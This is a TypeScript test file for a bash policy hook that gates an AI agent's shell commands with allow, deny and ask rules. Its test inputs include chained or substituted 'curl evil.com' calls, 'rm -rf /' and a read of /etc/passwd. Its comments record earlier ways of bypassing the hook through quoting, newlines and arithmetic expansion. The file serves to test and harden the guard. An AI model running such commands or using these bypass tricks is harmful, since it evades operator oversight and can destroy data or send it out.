import { describe, expect, it } from '@jest/globals';
import { Constants } from '@/common';
import { createBashPolicyHook } from '../createBashPolicyHook';
import type { PreToolUseHookInput, PreToolUseHookOutput } from '../types';

function makeInput(
  command: string,
  toolName: string = Constants.BASH_TOOL,
  extra?: Record<string, unknown>
): PreToolUseHookInput {
  return {
    hook_event_name: 'PreToolUse',
    runId: 'run-1',
    toolName,
    toolInput: { command, ...(extra ?? {}) },
    toolUseId: 'call-1',
  };
}

async function run(
  hook: ReturnType<typeof createBashPolicyHook>,
  input: PreToolUseHookInput
): Promise<PreToolUseHookOutput> {
  const out = await hook(input, new AbortController().signal);
  return out;
}

describe('createBashPolicyHook — pattern matching', () => {
  it('exact match: "npm test" matches only the literal command', async () => {
    const hook = createBashPolicyHook({
      allow: ['npm test'],
      default: 'deny',
    });
    expect((await run(hook, makeInput('npm test'))).decision).toBe('allow');
    expect((await run(hook, makeInput('npm test --watch'))).decision).toBe(
      'deny'
    );
    expect((await run(hook, makeInput('npm   test'))).decision).toBe('allow'); // whitespace-collapsed
    expect((await run(hook, makeInput('  npm test  '))).decision).toBe('allow'); // trimmed
  });

  it('prefix match: "git:*" matches git subcommands with boundary awareness', async () => {
    const hook = createBashPolicyHook({
      allow: ['git:*'],
      default: 'deny',
    });
    expect((await run(hook, makeInput('git status'))).decision).toBe('allow');
    expect((await run(hook, makeInput('git push origin main'))).decision).toBe(
      'allow'
    );
    expect((await run(hook, makeInput('git'))).decision).toBe('allow');
    expect((await run(hook, makeInput('gitlab clone'))).decision).toBe('deny'); // boundary holds
    expect((await run(hook, makeInput('gitk'))).decision).toBe('deny');
  });

  it('prefix match: backslash is literal inside single quotes (Codex P1 round-6)', async () => {
    // Pre-fix the separator scanner ran the `\\` escape branch BEFORE
    // checking the active quote, so `'abc\\'` never closed the
    // single-quoted span in the scanner — and the trailing `;
    // curl evil.com` looked "still inside the quote", so the `;`
    // wasn't detected as a separator. Bash actually DOES close the
    // single quote (backslash is literal in single quotes), so the
    // trailing curl runs unauthorized.
    const hook = createBashPolicyHook({
      allow: ['git:*'],
      default: 'deny',
    });
    expect(
      (await run(hook, makeInput('git status \'abc\\\'; curl https://evil.com')))
        .decision
    ).toBe('deny');
    // Sanity: legitimate single-quote arg with backslash inside still
    // matches the rule when there's no chaining.
    expect((await run(hook, makeInput('git status \'abc\\\''))).decision).toBe(
      'allow'
    );
  });

  it('exact match: refuses newline-separated input (Codex P2 round-6)', async () => {
    // Pre-fix `.replace(/\s+/g, ' ')` collapsed `\n` to a space, so
    // an exact rule `npm test` matched `npm\ntest` (which bash would
    // run as two separate commands).
    const hook = createBashPolicyHook({
      allow: ['npm test'],
      default: 'deny',
    });
    expect((await run(hook, makeInput('npm\ntest'))).decision).toBe('deny');
    expect((await run(hook, makeInput('npm\rtest'))).decision).toBe('deny');
    expect((await run(hook, makeInput('npm test; curl evil'))).decision).toBe(
      'deny'
    );
    // Sanity: plain `npm test` still allowed.
    expect((await run(hook, makeInput('npm test'))).decision).toBe('allow');
    expect((await run(hook, makeInput('npm  test'))).decision).toBe('allow'); // multiple spaces collapsed
    expect((await run(hook, makeInput('npm\ttest'))).decision).toBe('allow'); // tab collapsed
  });

  it('prefix match: command substitution INSIDE $((expr)) is still detected (Codex P1 round-14)', async () => {
    // Bash performs command substitution inside arithmetic
    // expansion before integer evaluation, so `$(( $(curl evil) +
    // 1 ))` actually runs curl. Pre-fix the round-13 arithmetic
    // skip walked past the whole body and never inspected for
    // inner `$(...)` / backticks, turning the policy hook into a
    // bypass for arithmetic-wrapped cmd subst.
    const hook = createBashPolicyHook({
      allow: ['git:*'],
      default: 'deny',
    });
    expect(
      (await run(hook, makeInput('git status $(( $(curl https://evil) + 1 ))')))
        .decision
    ).toBe('deny');
    expect(
      (await run(hook, makeInput('git log -n $(( `curl https://evil` ))')))
        .decision
    ).toBe('deny');
    // Nested arithmetic is fine (no actual cmd subst inside).
    expect(
      (await run(hook, makeInput('git log -n $(( $((1+2)) * 3 ))'))).decision
    ).toBe('allow');
  });

  it('prefix match: arithmetic $((expr)) skips inner operators (Codex P2 round-13)', async () => {
    // Pre-fix the round-10 arithmetic detection just `continue`d
    // without advancing past the body, so inner `<`/`>` operators
    // in `$((a<b))` still tripped the separator scan. Now we walk
    // the paren depth to skip the entire arithmetic body.
    const hook = createBashPolicyHook({
      allow: ['echo:*', 'git:*'],
      default: 'deny',
    });
    expect((await run(hook, makeInput('echo $((1<2))'))).decision).toBe(
      'allow'
    );
    expect((await run(hook, makeInput('git log -n $((a>b))'))).decision).toBe(
      'allow'
    );
    expect(
      (await run(hook, makeInput('echo $((1*(2+3))) result'))).decision
    ).toBe('allow');
    // Sanity: still catches bare `<` outside arithmetic.
    expect(
      (await run(hook, makeInput('echo foo < /etc/passwd'))).decision
    ).toBe('deny');
  });

  it('prefix match: arithmetic $((expr)) is NOT treated as command substitution (Codex P2 round-10)', async () => {
    // Pre-fix `containsShellSeparator` returned true on any `$(`,
    // including arithmetic `$((1+1))`. Bash evaluates arithmetic
    // expansion as an integer expression — no commands run. The
    // separator scan must allow it; otherwise benign commits and
    // numeric expressions get denied.
    const hook = createBashPolicyHook({
      allow: ['git:*'],
      default: 'deny',
    });
    expect(
      (await run(hook, makeInput('git commit -m "$((1+1))"'))).decision
    ).toBe('allow');
    expect((await run(hook, makeInput('git log -n $((2+3))'))).decision).toBe(
      'allow'
    );
    // Sanity: `$(` (single paren) is still command substitution.
    expect(
      (await run(hook, makeInput('git commit -m "$(date)"'))).decision
    ).toBe('deny');
  });

  it('prefix match: command substitution is blocked (Codex P1 round-4)', async () => {
    // Pre-fix `$(...)` wasn't in the separator set, so `git:*`
    // matched `git status $(curl https://evil)` — bash runs curl
    // first. Backticks were nominally caught but the previous
    // implementation treated `"…"` contents as fully literal, so
    // `"$(curl evil)"` slipped through even though bash interpolates
    // inside double quotes.
    const hook = createBashPolicyHook({
      allow: ['git:*'],
      default: 'deny',
    });
    expect(
      (await run(hook, makeInput('git status $(curl https://evil.com)')))
        .decision
    ).toBe('deny');
    expect(
      (await run(hook, makeInput('git status `curl https://evil.com`')))
        .decision
    ).toBe('deny');
    // Substitution inside double quotes is still interpolated.
    expect(
      (await run(hook, makeInput('git status "$(curl https://evil.com)"')))
        .decision
    ).toBe('deny');
    expect(
      (await run(hook, makeInput('git status "`curl https://evil.com`"')))
        .decision
    ).toBe('deny');
    // Inside single quotes — bash does NOT interpolate, so it's safe
    // for the rule to match. The arg is just literal text.
    expect(
      (await run(hook, makeInput('git status \'$(curl https://evil.com)\'')))
        .decision
    ).toBe('allow');
  });

  it('prefix match: newline-separated commands are blocked (Codex P1 round-3)', async () => {
    // Pre-fix `\n` passed the `\s` boundary AND wasn't in the
    // separator scan, so `git:*` matched `git status\ncurl evil`
    // and bash ran the trailing curl unauthorized. Newlines and
    // carriage returns are now treated as separators.
    const hook = createBashPolicyHook({
      allow: ['git:*'],
      default: 'deny',
    });
    expect(
      (await run(hook, makeInput('git status\ncurl https://evil.com'))).decision
    ).toBe('deny');
    expect(
      (await run(hook, makeInput('git status\rcurl https://evil.com'))).decision
    ).toBe('deny');
    // Even when the policy is permissive on the first command, the
    // newline-chained one should still fail.
    expect((await run(hook, makeInput('git status\nrm -rf /'))).decision).toBe(
      'deny'
    );
  });

  it('prefix match: shell separators do NOT count as boundary (Codex P1 round-2)', async () => {
    // Pre-fix `:*` accepted `;&|<>` as a boundary, so an allow rule
    // like `git:*` matched `git status; curl evil.com` and bash still
    // ran the trailing command — a policy bypass in `default: 'deny'`
    // posture. Boundary is now whitespace-only.
    const hook = createBashPolicyHook({
      allow: ['git:*'],
      default: 'deny',
    });
    expect(
      (await run(hook, makeInput('git status; curl evil.com'))).decision
    ).toBe('deny');
    expect(
      (await run(hook, makeInput('git status && rm -rf /tmp'))).decision
    ).toBe('deny');
    expect((await run(hook, makeInput('git log | head -1'))).decision).toBe(
      'deny'
    );
    expect((await run(hook, makeInput('git status > /tmp/out'))).decision).toBe(
      'deny'
    );
    // Whitespace still works.
    expect((await run(hook, makeInput('git status'))).decision).toBe('allow');
  });

  it('prefix match: "git push:*" requires the full prefix', async () => {
    const hook = createBashPolicyHook({
      ask: ['git push:*'],
      default: 'allow',
    });
    expect((await run(hook, makeInput('git push'))).decision).toBe('ask');
    expect((await run(hook, makeInput('git push origin main'))).decision).toBe(
      'ask'
    );
    expect((await run(hook, makeInput('git status'))).decision).toBe('allow');
    expect((await run(hook, makeInput('git pull'))).decision).toBe('allow');
  });

  it('wildcard "*" matches anything', async () => {
    const hook = createBashPolicyHook({
      ask: ['*'],
      default: 'allow',
    });
    expect((await run(hook, makeInput('ls'))).decision).toBe('ask');
    expect((await run(hook, makeInput('echo hi'))).decision).toBe('ask');
  });
});

describe('createBashPolicyHook — evaluation order', () => {
  it('deny beats ask beats allow beats default', async () => {
    const hook = createBashPolicyHook({
      deny: ['rm -rf:*'],
      ask: ['rm:*'],
      allow: ['cat:*'],
      default: 'deny',
    });
    expect((await run(hook, makeInput('rm -rf /tmp'))).decision).toBe('deny');
    expect((await run(hook, makeInput('rm -i foo'))).decision).toBe('ask');
    expect((await run(hook, makeInput('cat README'))).decision).toBe('allow');
    expect(
      (await run(hook, makeInput('curl https://example.com'))).decision
    ).toBe('deny');
  });

  it('pure allowlist: default deny + explicit allow', async () => {
    const hook = createBashPolicyHook({
      allow: ['ls:*', 'cat:*', 'git status'],
      default: 'deny',
    });
    expect((await run(hook, makeInput('ls -la'))).decision).toBe('allow');
    expect((await run(hook, makeInput('cat README.md'))).decision).toBe(
      'allow'
    );
    expect((await run(hook, makeInput('git status'))).decision).toBe('allow');
    expect(
      (await run(hook, makeInput('curl https://example.com'))).decision
    ).toBe('deny');
  });

  it('empty policy is a no-op (default allow)', async () => {
    const hook = createBashPolicyHook({});
    expect((await run(hook, makeInput('anything goes'))).decision).toBe(
      'allow'
    );
  });
});

describe('createBashPolicyHook — tool name filtering', () => {
  it('defaults to BASH_TOOL only — non-bash calls short-circuit to allow', async () => {
    const hook = createBashPolicyHook({
      deny: ['*'],
      default: 'deny',
    });
    expect((await run(hook, makeInput('rm -rf /', 'read_file'))).decision).toBe(
      'allow'
    );
    expect(
      (await run(hook, makeInput('rm -rf /', Constants.BASH_TOOL))).decision
    ).toBe('deny');
  });

  it('extracts code from run_tools_with_bash (Codex P1 round-7)', async () => {
    // Pre-fix `extractCommand` required `lang === 'bash'` to use
    // `code`, but `run_tools_with_bash` has no `lang` field. The
    // hook returned `allow` for every call to it, fully bypassing
    // the policy under `default: 'deny'`.
    const hook = createBashPolicyHook({
      deny: ['rm:*'],
      default: 'deny',
      toolNames: [Constants.BASH_PROGRAMMATIC_TOOL_CALLING],
    });
    const denyInput: PreToolUseHookInput = {
      hook_event_name: 'PreToolUse',
      runId: 'run-1',
      toolName: Constants.BASH_PROGRAMMATIC_TOOL_CALLING,
      toolInput: { code: 'rm -rf /tmp/x' },
      toolUseId: 'call-1',
    };
    expect((await run(hook, denyInput)).decision).toBe('deny');
    // Unknown command → default deny posture still fires.
    const denyDefault: PreToolUseHookInput = {
      hook_event_name: 'PreToolUse',
      runId: 'run-1',
      toolName: Constants.BASH_PROGRAMMATIC_TOOL_CALLING,
      toolInput: { code: 'curl https://example.com' },
      toolUseId: 'call-2',
    };
    expect((await run(hook, denyDefault)).decision).toBe('deny');
  });

  it('toolNames widens the gate', async () => {
    const hook = createBashPolicyHook({
      deny: ['*'],
      toolNames: [
        Constants.BASH_TOOL,
        Constants.BASH_PROGRAMMATIC_TOOL_CALLING,
      ],
    });
    // BASH_PROGRAMMATIC_TOOL_CALLING uses `{ code }`, not `{ command }`.
    const ptcInput: PreToolUseHookInput = {
      hook_event_name: 'PreToolUse',
      runId: 'run-1',
      toolName: Constants.BASH_PROGRAMMATIC_TOOL_CALLING,
      toolInput: { code: 'rm -rf /' },
      toolUseId: 'call-1',
    };
    expect((await run(hook, ptcInput)).decision).toBe('deny');
  });

  it('handles execute_code with lang=bash via the code/lang shape', async () => {
    const hook = createBashPolicyHook({
      deny: ['rm:*'],
      toolNames: [Constants.EXECUTE_CODE],
    });
    const input: PreToolUseHookInput = {
      hook_event_name: 'PreToolUse',
      runId: 'run-1',
      toolName: Constants.EXECUTE_CODE,
      toolInput: { lang: 'bash', code: 'rm -rf /tmp/x' },
      toolUseId: 'call-1',
    };
    expect((await run(hook, input)).decision).toBe('deny');
  });

  it('missing command short-circuits to allow', async () => {
    const hook = createBashPolicyHook({
      deny: ['*'],
    });
    const input: PreToolUseHookInput = {
      hook_event_name: 'PreToolUse',
      runId: 'run-1',
      toolName: Constants.BASH_TOOL,
      toolInput: {},
      toolUseId: 'call-1',
    };
    expect((await run(hook, input)).decision).toBe('allow');
  });
});

describe('createBashPolicyHook — reason templates', () => {
  it('substitutes {tool}, {command}, {pattern} in the reason', async () => {
    const hook = createBashPolicyHook({
      deny: ['rm -rf:*'],
      reason: 'tool={tool} command={command} pattern={pattern}',
    });
    const out = await run(hook, makeInput('rm -rf /'));
    expect(out.reason).toBe(
      `tool=${Constants.BASH_TOOL} command=rm -rf / pattern=rm -rf:*`
    );
  });

  it('omits reason when no template configured', async () => {
    const hook = createBashPolicyHook({ deny: ['rm:*'] });
    const out = await run(hook, makeInput('rm -rf /'));
    expect(out.reason).toBeUndefined();
  });

  it('ask decisions include allowedDecisions for the HITL interrupt', async () => {
    const hook = createBashPolicyHook({ ask: ['git push:*'] });
    const out = await run(hook, makeInput('git push origin main'));
    expect(out.decision).toBe('ask');
    expect(
      (out as { allowedDecisions?: readonly string[] }).allowedDecisions
    ).toEqual(['approve', 'reject']);
  });
});
